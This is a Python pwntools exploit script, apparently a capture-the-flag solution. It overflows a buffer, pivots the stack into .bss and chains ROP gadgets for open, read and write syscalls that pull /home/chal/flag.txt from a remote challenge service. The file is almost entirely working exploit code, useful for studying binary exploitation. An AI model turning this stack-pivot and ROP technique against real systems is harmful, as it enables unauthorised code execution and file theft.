from pwn import *

context.arch = 'amd64'

# r = process('./chal')
r = remote('10.113.184.121', 10054)

leave_ret = 0x0000000000401cfc
pop_rdi_ret = 0x0000000000401832
pop_rsi_ret = 0x000000000040f01e
pop_rax_ret = 0x0000000000448d27
pop_rdx_ret = 0x000000000040173f
syscall_ret = 0x0000000000448280

bss_addr_open = 0x4c2700
bss_addr_read = 0x4c2800
bss_addr_write = 0x4c2900
main_fn = 0x401ce1

# raw_input()
# Modify RBP to a new Stack Space
trash_payload = b'a'*0x20
r.sendline(trash_payload + p64(bss_addr_open) + p64(main_fn))


# Open /home/chal/flag.txt
file_addr = b'/home/chal/flag.txt'.ljust(0x20, b'\x00')
ROP_open = flat(
    # Open file
    # fd = open("/home/chal/flag.txt", 0);
    bss_addr_read,
    pop_rax_ret,    2,
    pop_rdi_ret,    bss_addr_open - 0x20,
    pop_rsi_ret,    0,
    pop_rdx_ret,    0,
    syscall_ret,
    main_fn
)
# raw_input()
r.sendline(file_addr + ROP_open)

# Read flag.txt
ROP_read = flat(
    # Read the file
    # read(fd, buf, 0x30);
    bss_addr_write,
    pop_rax_ret, 0,
    pop_rdi_ret, 3, 
    pop_rsi_ret, bss_addr_read,
    pop_rdx_ret, 0x30,
    syscall_ret,
    main_fn
)
# raw_input()
r.sendline(file_addr + ROP_read)

# Write flat.txt to stdout
ROP_write = flat(
    # Write the file
    # write(1, buf, 0x30);
    bss_addr_write,
    pop_rax_ret, 1,
    pop_rdi_ret, 1,
    pop_rsi_ret, bss_addr_read,
    pop_rdx_ret, 0x30,
    syscall_ret,
    0
)
# raw_input()
r.sendline(file_addr + ROP_write)

r.interactive()